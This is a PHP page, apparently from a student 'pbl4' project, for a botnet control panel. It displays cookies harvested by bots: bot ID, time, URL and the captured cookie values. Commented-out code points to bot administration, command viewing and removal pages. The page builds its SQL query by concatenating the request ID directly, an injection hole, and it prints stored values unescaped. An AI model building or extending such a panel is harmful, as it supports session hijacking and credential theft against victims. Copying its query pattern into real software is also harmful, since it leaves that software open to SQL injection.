

<?php
$db = new mysqli('localhost', 'root', '', 'pbl4_v2');
if (mysqli_connect_errno()) exit;

$header_display = "Cookies Result";

if (isset($_REQUEST['ID'])) {
  $id = $_REQUEST['ID'];
  $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
  if (mysqli_connect_errno()) exit;
  $sql = "Select * from cookies where IdBot = " . $id;
  $rs = mysqli_query($db, $sql);
}

// while ($stmt->fetch()) {

// 	$administer = "<a href='../php/openBot.php?ID=" . $ID . "'>administrator</a>";
// 	$delete = "<a href='../php/handleRemoveBot.php?ID=" . $ID . "'>delete</a>";
// 	$status_display = $status == 1 ? 'active' : 'non-active';
// 	echo '<td>' . $ID . '</td> <td>' . $ip . '</td> <td>' . $port . '</td> <td>' . $administer . '</td> <td>' . $status_display  . '</td><td>' . $delete . '</td>';
// }
echo '
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <!-- <link rel="stylesheet" type="text/css" href="../css/copy.css" /> -->
    <!-- <link rel="stylesheet" type="text/css" href="../css/openBot.css" /> -->
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
    />
    <title>Open Bot</title>
    <style>
      * {
        padding: 0;
        margin: 0;
        box-sizing: border-box;
      }
      body {
        /* background-image: url("../img/botactive.png"); */
        background: url("https://geekprank.com/hacker/green-back.jpg") no-repeat
          center center #000;
        color: #0f0;
        text-shadow: 0px 0px 10px #0f0;
        line-height: 21px;
        font-size: 15px;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
        max-width: 100%;
        max-height: 100%;
        overflow: hidden;
      }

      .inputCommand {
        border: 4px solid rgb(75, 194, 75);
        background: black;
        border-radius: 5px;
        justify-content: center;
      }

      /* Header */
      .header {
        width: 100%;
        height: 30px;
        background-color: #00ff00;
        display: flex;
        flex-direction: row;
        justify-content: space-between;
        /* margin-bottom: 50px; */
      }
      .ul_header {
        list-style: none;
      }
      .li_header {
        display: inline-block;
      }
      .ul_header,
      .li_header {
        margin: 0;
        padding: 0;
      }
      .label_header {
        color: black;
        font-weight: 600;
        padding-left: 10px;
        padding-top: 3px;
        font-size: 20px;
      }

      .li_header_icon {
        padding: 5px 8px;
      }

      a {
        text-decoration: none;
      }

      .container {
        display: flex;
        width: 100vw;
        height: 100vh;
        padding: 30px;
        column-gap: 40px;
      }
      .inputCommand {
        width: 80%;
      }
      .content {
        width: 100%;
        min-height: 90%;
        padding: 30px;
        display:flex;
        flex-direction: column;
        justify-content: space-between;

      }
      .content_table {
        width: 100%;
        text-align: center;
        border: 1px solid #00ff00;
      }
      .content_table-thead {
        background: #62fa62;
        color: black;
        text-transform: uppercase;
      }
      .content_table-tr {
        font-weight: bold;
        border: 1px solid #00ff00;
      }
      .content_table-td {
        font-weight: bold;
        border: 1px solid #00ff00;
        max-width: 300px;
        white-space: nowrap;
        overflow: hidden;       
        text-overflow: ellipsis;
      }
      .content_table-th{
        padding: 4px 0px;
      }
      .link_detail{
        color: #00ff00;
        text-decoration: underline;
      }
       .content_back
        {
            margin-top:16px;
            color: #00ff00;
            border:none;
            outline: none;
            font-size:16px;
            text-decoration: underline;
            background: transparent;
            cursor:pointer;
            align-self: flex-start;
        }
    </style>
  </head>

  <body>
    <div class="container">
      <div class="inputCommand">
        <div class="header">
          <ul class="ul_header">
            <li class="li_header label_header">
              <label for="">' . $header_display . '</label>
            </li>
          </ul>
          <ul class="ul_header">
            <li class="li_header li_header_icon">
              <i
                class="fa-solid fa-minus"
                style="color: black; text-shadow: none"
              ></i>
            </li>
            <li class="li_header li_header_icon">
              <i
                class="fa-regular fa-square"
                style="color: black; text-shadow: none"
              ></i>
            </li>
            <li class="li_header li_header_icon">
              <i
                class="fa-solid fa-x"
                style="color: black; text-shadow: none"
              ></i>
            </li>
          </ul>
        </div>
        <div class="content">
          <table class="content_table">
            <tr class="content_table-thead">
              <th class="content_table-th">ID </th>
              <th class="content_table-th">ID bot</th>
              <th class="content_table-th">Time</th>
              <th class="content_table-th">Url</th>
              <th class="content_table-th">Cookies Result</th>
                <th class="content_table-th">Detail</th>
            </tr>';

// <tr class="content_table-tr">
//   <td class="content_table-td">bbbbbbbbbbbb</td>
//   <td class="content_table-td">bbbbbbbbbbbb</td>
//   <td class="content_table-td">bbbbbbbbbbbb</td>
//   <td class="content_table-td">bbbbbbbbbbbb</td>
//   <td class="content_table-td">bbbbbbbbbbbb</td>
//   <td class="content_table-td">bbbbbbbbbbbb</td>
// </tr>
if (isset($_REQUEST['ID'])) {

  while ($row = mysqli_fetch_array($rs)) {
    echo '<tr class="content_table-tr">';
    $detail = '<a class="link_detail" href="viewCookiesDetail.php?IdCookies=' . $row['IdCookies'] . '">detail</a>';
    //    echo '<tr><td class="td"> ' . $row['IDNV'] . '</td><td class="td"> ' . $row['HoTen'] . '<td class="td"> ' . $row['DiaChi'] . '</td><td class="td"> ' . $row['IDPB'] . '</td></tr>';
    echo '<td class="content_table-td">' . $row['IdCookies'] . '</td> <td class="content_table-td">' . $row['IdBot'] . '</td><td class="content_table-td">' . $row['Time'] . '</td> <td class="content_table-td">' . $row['Url'] . '</td> <td class="content_table-td">' . $row['CookiesResult'] . '</td> <td class="content_table-td">' . $detail . '</td>';


    echo '</tr>';
  }
}
// while ($stmt->fetch()) {
//     echo '<tr class="content_table-tr">';
// $administer = $status == 1 ? "<a style='color:#00ff00;text-decoration:underline;' href='../php/openBot.php?ID=" . $ID . "'>administrator</a>" : "";
// $delete = "<a style='color:#00ff00;text-decoration:underline;' href='../php/handleRemoveBot.php?ID=" . $ID . "'>hidden</a>";
// $status_display = $status == 1 ? 'active' : 'non-active';
// $cmd =
//     "<a style='color:#00ff00;text-decoration:underline;' href='../php/viewCmd.php?ID=" . $ID . "'>view</a>";
//     echo '<td class="content_table-td">' . $ID . '</td> <td class="content_table-td">' . $ip . '</td> <td class="content_table-td">' . $port . '</td> <td class="content_table-td">' . $administer . '</td> <td class="content_table-td">' . $status_display  . '</td><td class="content_table-td"> ' . $cmd . '</td><td class="content_table-td"> view</td><td class="content_table-td"> view</td><td class="content_table-td"> view</td><td class="content_table-td">' . $delete . '</td>';
//     echo '</tr>';
// }
echo '	
          </table>
          <button class="content_back" onclick="history.back()">Go Back</button>

        </div>
      </div>
    ';
include_once("navigate.php");

    echo'
    </div>
  </body>
</html>

';
?>
